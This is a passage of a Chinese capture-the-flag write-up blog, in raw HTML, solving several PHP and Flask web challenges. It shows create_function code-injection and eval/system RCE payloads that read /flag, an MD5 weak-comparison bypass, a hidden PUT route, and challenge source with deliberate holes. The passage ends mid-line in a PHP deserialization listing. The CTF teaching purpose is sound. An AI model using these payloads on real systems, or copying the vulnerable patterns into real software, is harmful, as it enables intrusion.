data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Nub3dseXp6L2FydGljbGUvZGV0YWlscy8xMjcxNzE5MzE/dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLTJ+ZGVmYXVsdH5iYWlkdWpzX2JhaWR1bGFuZGluZ3dvcmR+ZGVmYXVsdC00LTEyNzE3MTkzMS1ibG9nLTEyMTI3NDc5NC4yMzUlNUV2MzglNUVwY19yZWxldmFudF9hbnRpX3QzX2Jhc2UmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS40MjQyLjMmYW1wO3V0bV9yZWxldmFudF9pbmRleD03\">creation_function () 代码注入</span></p>\n<p>上 payload:</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/55_5_55.php?a=\\create_function&amp;b=<span class=\"token punctuation\">&#125;</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ls /\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>/55_5_55.php?a=\\create_function&amp;b=<span class=\"token punctuation\">&#125;</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cat /flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>/*</pre></td></tr></table></figure><p>这里 create_function 前面的 \\ 是为了绕过正则匹配，而它之所以不会影响函数的功能则是因为它代表全局空间，关于全局空间可以参考官方解释：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvbGFuZ3VhZ2UubmFtZXNwYWNlcy5nbG9iYWwucGhw\">全局空间</span></p>\n<h3 id=\"nssctf-2022-spring-recruitbabyphp\"><a class=\"anchor\" href=\"#nssctf-2022-spring-recruitbabyphp\">#</a> [NSSCTF 2022 Spring Recruit]babyphp</h3>\n<h4 id=\"数组绕过md5弱比较php正则绕过\"><a class=\"anchor\" href=\"#数组绕过md5弱比较php正则绕过\">#</a> 数组绕过，md5 弱比较，PHP，正则绕过</h4>\n<p>进入题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include_once</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[0-9]/'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b1'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b2'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c1'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c2'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"yee\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"nop\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"go on\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"let's get some php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token delimiter important\">?></span></span> let's get some php</pre></td></tr></table></figure><p>上个题目会了的话，做这道题不是简简单单？</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>a[]=0&amp;b1[]=1&amp;b2[]=2&amp;c1=QNKCDZO&amp;c2=s878926199a</pre></td></tr></table></figure><h3 id=\"gdouctf-2023ez-web\"><a class=\"anchor\" href=\"#gdouctf-2023ez-web\">#</a> [GDOUCTF 2023]EZ WEB</h3>\n<h4 id=\"flask源码泄露pythonhttp协议\"><a class=\"anchor\" href=\"#flask源码泄露pythonhttp协议\">#</a> Flask，源码泄露，Python,Http 协议。</h4>\n<p>进入题目是些无用的信息，打开源代码发现</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!-- /src --></span></pre></td></tr></table></figure><p>访问 /src</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> flask</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>app <span class=\"token operator\">=</span> flask<span class=\"token punctuation\">.</span>Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">return</span> flask<span class=\"token punctuation\">.</span>send_file<span class=\"token punctuation\">(</span><span class=\"token string\">'index.html'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/src'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">source</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">return</span> flask<span class=\"token punctuation\">.</span>send_file<span class=\"token punctuation\">(</span><span class=\"token string\">'app.py'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/super-secret-route-nobody-will-guess'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'PUT'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>一个简单的 flask 框架，向 /super-secret-route-nobody-will-guess 发送请求包，中途用 bp 截包，将请求方式 GET 改为 PUT 即可获取 flag。</p>\n<h3 id=\"litctf-2023vim-yyds\"><a class=\"anchor\" href=\"#litctf-2023vim-yyds\">#</a> [LitCTF 2023]Vim yyds</h3>\n<h4 id=\"vim泄露rce信息收集\"><a class=\"anchor\" href=\"#vim泄露rce信息收集\">#</a> vim 泄露，rce，信息收集</h4>\n<p>既然提示 vim 泄露，进入题目后，浅浅地扫一下。</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>[<span class=\"token property\">00</span><span class=\"token punctuation\">:</span><span class=\"token property\">53</span><span class=\"token punctuation\">:</span>54] 200 <span class=\"token operator\">-</span>   12KB <span class=\"token operator\">-</span> /.index.php.swp</pre></td></tr></table></figure><p>扫到后搜索得到一个文件：index.php.swp。</p>\n<p>这是由于非正常关闭 vim 产生的文件，这个文件是一个临时交换文件，用来备份缓冲区中的内容。</p>\n<p>详细内容可以参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B3aWxpbmcvYXJ0aWNsZS9kZXRhaWxzLzUxODMwNzgx\">Vim 不正常退出产生的 swp 文件</span></p>\n<p>但是我们可以使用</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">vim</span> <span class=\"token parameter variable\">-r</span>  index.php.swp</pre></td></tr></table></figure><p>给它复原。</p>\n<p>得到：</p>\n<pre><code class=\"language-php+HTML\">&lt;html&gt;\n&lt;head&gt;\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\n    &lt;style type=&quot;text/css&quot;&gt;\n        body,\n        html &#123;\n            display: flex;\n            align-items: center;\n            justify-content: center;\n        &#125;\n\n        div.vim &#123;\n            display: flex;\n            align-content: center;\n            vertical-align: middle;\n            justify-content: center;\n        &#125;\n\n        img &#123;\n            border: none;\n            width: 8rem;\n            height: auto;\n        &#125;\n\n        h1.vim_yyds &#123;\n            color: #50f728;\n            display: flex;\n            align-items: flex-start;\n            justify-content: center;\n            margin-top: 50;\n            margin-left: 5px;\n        &#125;\n\n        h3.vim_said &#123;\n            color: #39c2ff;\n            display: flex;\n            justify-content: center;\n            align-items: center;\n        &#125;\n\n        br,\n        p &#123;\n            font-size: 20;\n        &#125;\n    &lt;/style&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;main&gt;\n        &lt;div class=&quot;vim&quot;&gt;\n            &lt;img src=&quot;https://www.bing.com/th?id=OSAAS.7B95FA2D97CE022F5E7949F60E350A25&amp;pid=TechQna&quot;&gt;&lt;/img&gt;\n            &lt;h1 class=&quot;vim_yyds&quot;&gt;\n                Vim yyds\n            &lt;/h1&gt;\n        &lt;/div&gt;\n        &lt;h3 class=&quot;vim_said&quot;&gt;\n            队里师傅说Vim是世界上最好的编辑器，不接受反驳\n        &lt;/h3&gt;\n        &lt;div class=&quot;can_can_vim&quot;&gt;\n            &lt;?php\n            error_reporting(0);\n            $password = &quot;Give_Me_Your_Flag&quot;;\n            echo &quot;&lt;p&gt;can can need Vim &lt;/p&gt;&quot;;\n            if ($_POST['password'] === base64_encode($password)) &#123;\n                echo &quot;&lt;p&gt;Oh You got my password!&lt;/p&gt;&quot;;\n                eval(system($_POST['cmd']));\n            &#125;\n            ?&gt;\n        &lt;/div&gt;\n    &lt;/main&gt;\n&lt;/body&gt;\n</code></pre>\n<p>将 $password  base64 编码后 post 传入后，就能用 cmd 来进行命令执行了。</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&amp;cmd=ls <span class=\"token operator\">/</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&amp;cmd=cat /flag</pre></td></tr></table></figure><h2 id=\"2023917\"><a class=\"anchor\" href=\"#2023917\">#</a> 2023/9/17</h2>\n<h3 id=\"nisactf-2022babyserialize\"><a class=\"anchor\" href=\"#nisactf-2022babyserialize\">#</a> [NISACTF 2022]babyserialize</h3>\n<h4 id=\"反序列化phppop链代码审计\"><a class=\"anchor\" href=\"#反序列化phppop链代码审计\">#</a> 反序列化，PHP，POP 链，代码审计。</h4>\n<p>php 反序列化题，构造好链子即可：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"waf.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">NISA</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$fun</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"show_me_flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$txw4ever</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">fun</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"show_me_flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token function\">hint</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$from</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">fun</span><span class=\"token operator\">=</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">fun</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\" \"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token function\">checkcheck</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">txw4ever</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">txw4ever</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">TianXiWei</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$ext</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$x</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">ext</span><span class=\"token operator\">-></span><span class=\"token function\">nisa</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Ilovetxw</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$huang</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$su</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fun1</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$arg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">huang</span><span class=\"token operator\">-></span><span class=\"token property\">fun</span><span class=\"token operator\">=</span><span class=\"token variable\">$arg</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token variable\">$bb</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">su</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$bb</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">four</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"TXW4EVER\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$fun</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'abc'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__set</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">fun</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"sixsixsix\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>            <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ser'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    @<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ser'</span><span class=\"token punctuation\">]</span><span class=\"token 